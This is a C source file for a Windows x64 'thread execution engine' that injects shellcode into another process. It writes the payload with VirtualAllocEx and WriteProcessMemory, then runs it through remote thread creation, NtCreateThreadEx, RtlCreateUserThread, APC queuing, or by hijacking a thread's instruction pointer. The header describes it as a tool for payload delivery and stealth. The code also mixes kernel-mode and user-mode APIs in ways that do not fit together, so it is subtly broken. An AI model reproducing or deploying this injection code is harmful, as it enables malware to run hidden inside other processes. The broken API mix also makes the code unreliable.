/*
 * Thread Execution Engine
 *
 * Thread creation, hijacking, and shellcode execution for payload delivery.
 * Supports multiple execution methods for stealth and compatibility.
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#include "ThreadExecution.h"
#include "TypeDefinitions.h"
#include "Constants.h"
#include <ntifs.h>

// NT API function pointers (resolved dynamically)
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    IN HANDLE ThreadHandle,
    IN PVOID ApcRoutine,
    IN PVOID ApcArgument1 OPTIONAL,
    IN PVOID ApcArgument2 OPTIONAL,
    IN PVOID ApcArgument3 OPTIONAL
);

typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId
);

NTSTATUS InitializeThreadExecutor(
    OUT PTHREAD_EXECUTOR_CONTEXT Context,
    IN HANDLE TargetProcess
)
{
    NTSTATUS Status;
    PVOID NtdllBase;

    if (Context == NULL || TargetProcess == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    RtlZeroMemory(Context, sizeof(THREAD_EXECUTOR_CONTEXT));
    Context->Tag = THREAD_EXECUTOR_TAG;
    Context->TargetProcess = TargetProcess;
    Context->ExecutionMethod = ThreadExecutionMethodCreateRemote;

    // Get ntdll.dll base
    NtdllBase = GetModuleHandleW(L"ntdll.dll");
    if (NtdllBase == NULL) {
        return STATUS_DLL_NOT_FOUND;
    }

    // Resolve NT API functions
    Context->NtCreateThreadEx = (PVOID)GetProcAddress(NtdllBase, "NtCreateThreadEx");
    Context->NtQueueApcThread = (PVOID)GetProcAddress(NtdllBase, "NtQueueApcThread");
    Context->RtlCreateUserThread = (PVOID)GetProcAddress(NtdllBase, "RtlCreateUserThread");

    if (Context->NtCreateThreadEx == NULL) {
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    Context->Initialized = TRUE;
    return STATUS_SUCCESS;
}

NTSTATUS ExecutePayloadViaThread(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter OPTIONAL,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;
    HANDLE hThread = NULL;

    if (Context == NULL || !Context->Initialized || PayloadAddress == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    switch (Context->ExecutionMethod) {
        case ThreadExecutionMethodCreateRemote:
            Status = CreateRemoteThreadExecution(Context, PayloadAddress, PayloadParameter, &hThread);
            break;

        case ThreadExecutionMethodNtCreateThreadEx:
            Status = NtCreateThreadExExecution(Context, PayloadAddress, PayloadParameter, &hThread);
            break;

        case ThreadExecutionMethodRtlCreateUserThread:
            Status = RtlCreateUserThreadExecution(Context, PayloadAddress, PayloadParameter, &hThread);
            break;

        case ThreadExecutionMethodQueueApc:
            Status = QueueApcExecution(Context, PayloadAddress, PayloadParameter);
            break;

        case ThreadExecutionMethodHijack:
            Status = ThreadHijackExecution(Context, PayloadAddress, PayloadParameter, &hThread);
            break;

        default:
            Status = STATUS_NOT_IMPLEMENTED;
            break;
    }

    if (NT_SUCCESS(Status)) {
        Context->ExecutionCount++;
        Context->LastExecutionTime = KeQuerySystemTimePrecise();

        if (ThreadHandle != NULL && hThread != NULL) {
            *ThreadHandle = hThread;
        }
    }

    return Status;
}

NTSTATUS CreateRemoteThreadExecution(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter,
    OUT PHANDLE ThreadHandle
)
{
    HANDLE hThread;
    DWORD ThreadId;

    hThread = CreateRemoteThread(
        Context->TargetProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)PayloadAddress,
        PayloadParameter,
        0,
        &ThreadId
    );

    if (hThread == NULL) {
        return STATUS_UNSUCCESSFUL;
    }

    if (ThreadHandle != NULL) {
        *ThreadHandle = hThread;
    }

    return STATUS_SUCCESS;
}

NTSTATUS NtCreateThreadExExecution(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter,
    OUT PHANDLE ThreadHandle
)
{
    NTSTATUS Status;
    HANDLE hThread = NULL;
    pNtCreateThreadEx NtCreateThreadEx;

    NtCreateThreadEx = (pNtCreateThreadEx)Context->NtCreateThreadEx;
    if (NtCreateThreadEx == NULL) {
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    Status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        Context->TargetProcess,
        PayloadAddress,
        PayloadParameter,
        0,
        0,
        0,
        0,
        NULL
    );

    if (NT_SUCCESS(Status) && ThreadHandle != NULL) {
        *ThreadHandle = hThread;
    }

    return Status;
}

NTSTATUS RtlCreateUserThreadExecution(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter,
    OUT PHANDLE ThreadHandle
)
{
    NTSTATUS Status;
    HANDLE hThread = NULL;
    CLIENT_ID ClientId;
    pRtlCreateUserThread RtlCreateUserThread;

    RtlCreateUserThread = (pRtlCreateUserThread)Context->RtlCreateUserThread;
    if (RtlCreateUserThread == NULL) {
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    Status = RtlCreateUserThread(
        Context->TargetProcess,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        PayloadAddress,
        PayloadParameter,
        &hThread,
        &ClientId
    );

    if (NT_SUCCESS(Status) && ThreadHandle != NULL) {
        *ThreadHandle = hThread;
    }

    return Status;
}

NTSTATUS QueueApcExecution(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter
)
{
    NTSTATUS Status;
    HANDLE hThread;
    pNtQueueApcThread NtQueueApcThread;

    NtQueueApcThread = (pNtQueueApcThread)Context->NtQueueApcThread;
    if (NtQueueApcThread == NULL) {
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    // Find alertable thread in target process
    Status = FindAlertableThread(Context->TargetProcess, &hThread);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Queue APC to execute payload
    Status = NtQueueApcThread(
        hThread,
        PayloadAddress,
        PayloadParameter,
        NULL,
        NULL
    );

    CloseHandle(hThread);
    return Status;
}

NTSTATUS ThreadHijackExecution(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID PayloadAddress,
    IN PVOID PayloadParameter,
    OUT PHANDLE ThreadHandle
)
{
    NTSTATUS Status;
    HANDLE hThread = NULL;
    CONTEXT ThreadContext;
    PVOID OriginalRip;

    // Find suitable thread to hijack
    Status = FindHijackableThread(Context->TargetProcess, &hThread);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Suspend thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread);
        return STATUS_UNSUCCESSFUL;
    }

    // Get thread context
    ThreadContext.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ThreadContext)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        return STATUS_UNSUCCESSFUL;
    }

    // Save original RIP
    OriginalRip = (PVOID)ThreadContext.Rip;

    // Redirect RIP to payload
    ThreadContext.Rip = (DWORD64)PayloadAddress;
    ThreadContext.Rcx = (DWORD64)PayloadParameter;  // First parameter in x64 calling convention

    // Set modified context
    if (!SetThreadContext(hThread, &ThreadContext)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        return STATUS_UNSUCCESSFUL;
    }

    // Resume thread to execute payload
    if (ResumeThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread);
        return STATUS_UNSUCCESSFUL;
    }

    if (ThreadHandle != NULL) {
        *ThreadHandle = hThread;
    }

    return STATUS_SUCCESS;
}

NTSTATUS FindAlertableThread(
    IN HANDLE ProcessHandle,
    OUT PHANDLE ThreadHandle
)
{
    NTSTATUS Status;
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    DWORD ProcessId;

    ProcessId = GetProcessId(ProcessHandle);
    if (ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return STATUS_UNSUCCESSFUL;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return STATUS_NOT_FOUND;
    }

    do {
        if (te32.th32OwnerProcessID == ProcessId) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (hThread != NULL) {
                // Check if thread is in alertable wait state
                DWORD WaitResult = WaitForSingleObject(hThread, 0);
                if (WaitResult == WAIT_TIMEOUT) {
                    *ThreadHandle = hThread;
                    CloseHandle(hSnapshot);
                    return STATUS_SUCCESS;
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    return STATUS_NOT_FOUND;
}

NTSTATUS FindHijackableThread(
    IN HANDLE ProcessHandle,
    OUT PHANDLE ThreadHandle
)
{
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    DWORD ProcessId;

    ProcessId = GetProcessId(ProcessHandle);
    if (ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return STATUS_UNSUCCESSFUL;
    }

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return STATUS_NOT_FOUND;
    }

    // Find first thread in target process
    do {
        if (te32.th32OwnerProcessID == ProcessId) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (hThread != NULL) {
                *ThreadHandle = hThread;
                CloseHandle(hSnapshot);
                return STATUS_SUCCESS;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    return STATUS_NOT_FOUND;
}

NTSTATUS ExecuteShellcode(
    IN PTHREAD_EXECUTOR_CONTEXT Context,
    IN PVOID Shellcode,
    IN SIZE_T ShellcodeSize,
    IN PVOID Parameter OPTIONAL,
    OUT PHANDLE ThreadHandle OPTIONAL
)
{
    NTSTATUS Status;
    PVOID RemoteBuffer = NULL;
    SIZE_T BytesWritten;

    if (Context == NULL || Shellcode == NULL || ShellcodeSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    // Allocate memory in target process
    RemoteBuffer = VirtualAllocEx(
        Context->TargetProcess,
        NULL,
        ShellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (RemoteBuffer == NULL) {
        return STATUS_NO_MEMORY;
    }

    // Write shellcode to target process
    if (!WriteProcessMemory(
        Context->TargetProcess,
        RemoteBuffer,
        Shellcode,
        ShellcodeSize,
        &BytesWritten
    )) {
        VirtualFreeEx(Context->TargetProcess, RemoteBuffer, 0, MEM_RELEASE);
        return STATUS_UNSUCCESSFUL;
    }

    // Change protection to execute-read
    DWORD OldProtect;
    VirtualProtectEx(
        Context->TargetProcess,
        RemoteBuffer,
        ShellcodeSize,
        PAGE_EXECUTE_READ,
        &OldProtect
    );

    // Execute shellcode via thread
    Status = ExecutePayloadViaThread(
        Context,
        RemoteBuffer,
        Parameter,
        ThreadHandle
    );

    if (!NT_SUCCESS(Status)) {
        VirtualFreeEx(Context->TargetProcess, RemoteBuffer, 0, MEM_RELEASE);
    }

    return Status;
}

NTSTATUS WaitForThreadCompletion(
    IN HANDLE ThreadHandle,
    IN ULONG TimeoutMs,
    OUT PULONG ExitCode OPTIONAL
)
{
    DWORD WaitResult;
    DWORD ThreadExitCode;

    if (ThreadHandle == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    WaitResult = WaitForSingleObject(ThreadHandle, TimeoutMs);

    if (WaitResult == WAIT_OBJECT_0) {
        if (ExitCode != NULL) {
            if (GetExitCodeThread(ThreadHandle, &ThreadExitCode)) {
                *ExitCode = ThreadExitCode;
            }
        }
        return STATUS_SUCCESS;
    }
    else if (WaitResult == WAIT_TIMEOUT) {
        return STATUS_TIMEOUT;
    }

    return STATUS_UNSUCCESSFUL;
}

VOID CleanupThreadExecutor(IN PTHREAD_EXECUTOR_CONTEXT Context)
{
    if (Context != NULL) {
        RtlZeroMemory(Context, sizeof(THREAD_EXECUTOR_CONTEXT));
    }
}
